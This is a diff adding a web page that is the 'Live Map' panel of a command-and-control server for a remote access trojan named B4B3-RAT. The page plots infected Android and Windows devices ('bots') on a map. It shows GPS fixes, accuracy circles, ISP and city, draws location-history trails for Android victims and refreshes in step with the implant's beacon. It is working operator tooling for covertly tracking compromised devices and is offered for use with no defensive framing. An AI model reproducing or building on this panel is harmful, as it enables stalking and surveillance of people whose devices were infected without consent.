@@ -1,0 +1,230 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Live Map — B4B3-RAT C2</title>
+<script src="js/config.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--bg:#0D1B2A;--bg2:#1A2E42;--bg3:#243C57;--accent:#00C2A8;--warn:#F4A261;--text:#E8EEF4;--muted:#6B7FA3;--light:#BDD3E8;--green:#2dbe6c;--red:#e84242}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',Arial,sans-serif;height:100vh;display:flex;flex-direction:column;overflow:hidden}
+header{background:var(--bg2);border-bottom:1px solid var(--bg3);padding:0 20px;display:flex;align-items:center;gap:12px;height:52px;flex-shrink:0}
+.logo{font-family:monospace;font-size:12px;color:var(--accent);letter-spacing:2px}
+.spacer{flex:1}
+.layout{display:flex;flex:1;overflow:hidden;min-height:0}
+#map{flex:1;min-height:0}
+.sidebar{width:280px;background:var(--bg2);border-left:1px solid var(--bg3);display:flex;flex-direction:column;overflow:hidden;flex-shrink:0}
+.sb-head{padding:12px 14px 8px;border-bottom:1px solid var(--bg3)}
+.sb-head h2{font-size:10px;font-weight:700;color:var(--muted);letter-spacing:1px;text-transform:uppercase;margin-bottom:6px}
+.stat-row{display:flex;gap:8px;flex-wrap:wrap}
+.stat{background:var(--bg3);border-radius:6px;padding:5px 10px;font-size:11px;text-align:center}
+.stat .n{font-size:18px;font-weight:700}
+#bot-list{flex:1;overflow-y:auto;padding:6px 8px}
+.bot-card{background:var(--bg);border:1px solid var(--bg3);border-radius:7px;padding:9px 11px;margin-bottom:5px;cursor:pointer;transition:.1s}
+.bot-card:hover{border-color:var(--accent)}
+.bot-card.no-loc{opacity:.5;cursor:default}
+.bot-name{font-size:12px;font-weight:600;color:var(--light);margin-bottom:2px}
+.bot-meta{font-size:10px;color:var(--muted);line-height:1.6}
+.dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:4px}
+.dot-green{background:var(--green)}.dot-red{background:var(--red)}
+.badge-android{background:#0d2e1a;color:#2dbe6c;font-size:9px;font-weight:700;padding:1px 5px;border-radius:4px;margin-left:4px}
+.badge-win{background:#0d1a2e;color:#7be0d4;font-size:9px;font-weight:700;padding:1px 5px;border-radius:4px;margin-left:4px}
+.badge-ip{background:#2e2a0d;color:#f4a261;font-size:9px;font-weight:700;padding:1px 5px;border-radius:4px;margin-left:4px}
+.btn{cursor:pointer;border:none;border-radius:7px;font-family:inherit;font-size:12px;padding:6px 12px}
+.btn-sec{background:var(--bg3);color:var(--light)}.btn-sec:hover{background:var(--accent);color:var(--bg)}
+.trail-toggle{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--muted);padding:8px 14px;border-top:1px solid var(--bg3);flex-shrink:0}
+.trail-toggle input{accent-color:var(--accent)}
+a{color:var(--accent);text-decoration:none}
+</style>
+</head>
+<body>
+<header>
+  <div class="logo"><a href="index.html">◀ B4B3-RAT</a> / 🌍 Live Map</div>
+  <div class="spacer"></div>
+  <span id="last-update" style="font-size:11px;color:var(--muted)">—</span>
+  <button class="btn btn-sec" onclick="refresh()" style="margin-left:8px">↻ Refresh</button>
+  <a class="btn btn-sec" href="android.html" style="margin-left:4px">📱 Android</a>
+</header>
+<div class="layout">
+  <div id="map"></div>
+  <div class="sidebar">
+    <div class="sb-head">
+      <h2>🌍 Agent Locations</h2>
+      <div class="stat-row">
+        <div class="stat"><div class="n" id="cnt-total" style="color:var(--accent)">0</div><div>Total</div></div>
+        <div class="stat"><div class="n" id="cnt-gps" style="color:var(--green)">0</div><div>GPS</div></div>
+        <div class="stat"><div class="n" id="cnt-ip" style="color:var(--warn)">0</div><div>IP-only</div></div>
+      </div>
+    </div>
+    <div id="bot-list"><div style="padding:12px;color:var(--muted);font-size:12px;font-style:italic">Loading...</div></div>
+    <div class="trail-toggle">
+      <input type="checkbox" id="trail-chk" checked onchange="toggleTrails()">
+      <label for="trail-chk">Show Android GPS trail</label>
+    </div>
+  </div>
+</div>
+
+<script>
+const BASE = (typeof C2_BASE!=='undefined') ? C2_BASE : '';
+
+// ── MAP INIT ──────────────────────────────────────────────────────────────────
+const map = L.map('map', { center: [20, 0], zoom: 2, zoomControl: true });
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+  attribution: '© OpenStreetMap contributors',
+  maxZoom: 19
+}).addTo(map);
+
+// Custom marker icons
+const ICONS = {
+  android: L.divIcon({ html: '<div style="font-size:22px;text-shadow:0 0 4px #000">📱</div>', iconSize:[28,28], iconAnchor:[14,28], className:''}),
+  windows: L.divIcon({ html: '<div style="font-size:20px;text-shadow:0 0 4px #000">🖥️</div>', iconSize:[26,26], iconAnchor:[13,26], className:''}),
+  ip:      L.divIcon({ html: '<div style="font-size:20px;text-shadow:0 0 4px #000;opacity:.7">🌐</div>', iconSize:[26,26], iconAnchor:[13,26], className:''}),
+};
+
+let markers   = {};   // id → L.Marker
+let circles   = {};   // id → L.Circle (accuracy)
+let trails    = {};   // id → L.Polyline
+let allBots   = [];
+let showTrail = true;
+
+// ── DATA ──────────────────────────────────────────────────────────────────────
+async function refresh() {
+  try {
+    const r = await fetch(BASE+'/api/location/all', {credentials:'include'});
+    if (r.status===401){location.href='login.html';return;}
+    allBots = await r.json();
+    renderMap(allBots);
+    renderSidebar(allBots);
+    document.getElementById('last-update').textContent = 'Updated ' + new Date().toLocaleTimeString();
+  } catch(e){console.error(e);}
+}
+
+async function loadTrail(id) {
+  try {
+    const r = await fetch(BASE+`/api/android/location/${id}`,{credentials:'include'});
+    if (!r.ok) return [];
+    const d = await r.json();
+    return d.history || [];
+  } catch { return []; }
+}
+
+// ── MAP RENDER ────────────────────────────────────────────────────────────────
+async function renderMap(bots) {
+  const seen = new Set();
+
+  for (const b of bots) {
+    if (!b.lat || !b.lon) continue;
+    seen.add(b.id);
+
+    const isGps  = b.source !== 'ip';
+    const icon   = b.platform==='android' ? ICONS.android : (isGps ? ICONS.windows : ICONS.ip);
+    const latlng = [b.lat, b.lon];
+
+    const popupHtml = `
+      <div style="font-family:monospace;font-size:12px;line-height:1.8;min-width:200px">
+        <strong style="color:#0052CC">${esc(b.label||b.id)}</strong><br>
+        <span style="color:#5e6c84">${b.platform.toUpperCase()} · ${isGps?'GPS':'IP-based'}</span><br>
+        ${b.acc != null ? `Accuracy: ±${b.acc}m<br>` : ''}
+        ${b.city ? `City: ${esc(b.city)}, ${esc(b.country)}<br>` : ''}
+        ${b.isp  ? `ISP: ${esc(b.isp)}<br>` : ''}
+        Last fix: ${new Date(b.time).toLocaleString()}<br>
+        Last seen: ${timeAgo(b.lastSeen)}
+        ${b.lat && b.lon ? `<br><a href="https://maps.google.com/?q=${b.lat},${b.lon}" target="_blank">Open in Google Maps ↗</a>` : ''}
+      </div>`;
+
+    if (markers[b.id]) {
+      markers[b.id].setLatLng(latlng).setIcon(icon).setPopupContent(popupHtml);
+    } else {
+      markers[b.id] = L.marker(latlng, {icon}).addTo(map).bindPopup(popupHtml);
+    }
+
+    // Accuracy circle for GPS fixes
+    if (isGps && b.acc && b.acc < 5000) {
+      if (circles[b.id]) circles[b.id].setLatLng(latlng).setRadius(b.acc);
+      else circles[b.id] = L.circle(latlng, {radius:b.acc, color:'#00C2A8', fillColor:'#00C2A8', fillOpacity:.08, weight:1}).addTo(map);
+    }
+
+    // Load and draw GPS trail for Android
+    if (b.platform === 'android' && showTrail) {
+      const history = await loadTrail(b.id);
+      if (history.length > 1) {
+        const pts = history.map(p=>[p.lat, p.lon]);
+        if (trails[b.id]) trails[b.id].setLatLngs(pts);
+        else trails[b.id] = L.polyline(pts, {color:'#00C2A8', weight:2, opacity:.6, dashArray:'4 4'}).addTo(map);
+      }
+    }
+  }
+
+  // Remove stale markers
+  for (const id of Object.keys(markers)) {
+    if (!seen.has(id)) {
+      markers[id].remove(); delete markers[id];
+      circles[id]?.remove(); delete circles[id];
+      trails[id]?.remove(); delete trails[id];
+    }
+  }
+}
+
+function toggleTrails() {
+  showTrail = document.getElementById('trail-chk').checked;
+  for (const [id, line] of Object.entries(trails)) {
+    showTrail ? map.addLayer(line) : map.removeLayer(line);
+  }
+}
+
+// ── SIDEBAR ───────────────────────────────────────────────────────────────────
+function renderSidebar(bots) {
+  const gps = bots.filter(b=>b.source!=='ip' && b.lat);
+  const ip  = bots.filter(b=>b.source==='ip'  && b.lat);
+  document.getElementById('cnt-total').textContent = bots.length;
+  document.getElementById('cnt-gps').textContent   = gps.length;
+  document.getElementById('cnt-ip').textContent    = ip.length;
+
+  const list = document.getElementById('bot-list');
+  if (!bots.length) { list.innerHTML='<div style="padding:12px;color:var(--muted);font-size:12px;font-style:italic">No location data yet</div>'; return; }
+
+  list.innerHTML = bots.map(b => {
+    const online = isOnline(b.lastSeen);
+    const hasLoc = b.lat && b.lon;
+    const isGps  = b.source !== 'ip';
+    const badge  = b.platform==='android'
+      ? `<span class="badge-android">ANDROID</span>`
+      : `<span class="badge-win">WINDOWS</span>`;
+    const locBadge = !isGps ? `<span class="badge-ip">IP-ONLY</span>` : '';
+    const locLine  = hasLoc
+      ? (b.city ? `${esc(b.city)}, ${esc(b.country)}` : `${b.lat.toFixed(4)}, ${b.lon.toFixed(4)}`)
+      : 'No location data';
+    return `<div class="bot-card${!hasLoc?' no-loc':''}" onclick="${hasLoc?`flyTo(${b.lat},${b.lon},'${b.id}')`:''}" >
+      <div class="bot-name"><span class="dot ${online?'dot-green':'dot-red'}"></span>${esc(b.label||b.id.slice(0,18))}${badge}${locBadge}</div>
+      <div class="bot-meta">
+        📍 ${locLine}<br>
+        ${b.acc!=null?`±${b.acc}m · `:''}${timeAgo(b.lastSeen)}
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function flyTo(lat, lon, id) {
+  map.flyTo([lat, lon], 14, {duration: 1.2});
+  if (markers[id]) setTimeout(()=>markers[id].openPopup(), 1300);
+}
+
+// ── HELPERS ───────────────────────────────────────────────────────────────────
+function isOnline(ts){ return ts && (Date.now()-new Date(ts).getTime())<90000; }
+function timeAgo(ts){
+  if(!ts) return 'never';
+  const s=Math.round((Date.now()-new Date(ts).getTime())/1000);
+  if(s<60) return s+'s ago';
+  if(s<3600) return Math.floor(s/60)+'m ago';
+  return Math.floor(s/3600)+'h ago';
+}
+function esc(s){ return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+// ── INIT ──────────────────────────────────────────────────────────────────────
+refresh();
+setInterval(refresh, 30000);  // auto-refresh every 30s (matches beacon interval)
+</script>
+</body>
+</html>
